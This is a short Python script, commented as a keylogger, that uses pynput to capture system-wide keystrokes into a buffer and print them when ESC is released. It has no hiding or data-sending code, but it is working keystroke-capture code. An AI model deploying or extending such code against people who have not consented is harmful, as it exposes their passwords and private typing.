from pynput import keyboard
from pynput.keyboard import KeyCode, Key
from io import StringIO
import logging


# Keylogger. Currently using ESC to stop capture
logger = logging.getLogger(__name__)
inputs = StringIO()


def on_press(key: Key | KeyCode):
    if isinstance(key, KeyCode):
        logger.debug(f'Alphanumeric character {key.char} pressed')
        inputs.write(key.char)
    elif isinstance(key, Key):
        logger.debug(f"Special character {key} pressed")
        match key:
            case Key.backspace:
                inputs.write("\b")
            case Key.space:
                inputs.write(" ")


def on_release(key: Key | KeyCode):
    global inputs

    logger.debug(f"Character {key} released")
    if isinstance(key, Key):
        match key:
            case Key.esc:
                print(inputs.getvalue())
                inputs.close()
                inputs = StringIO()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()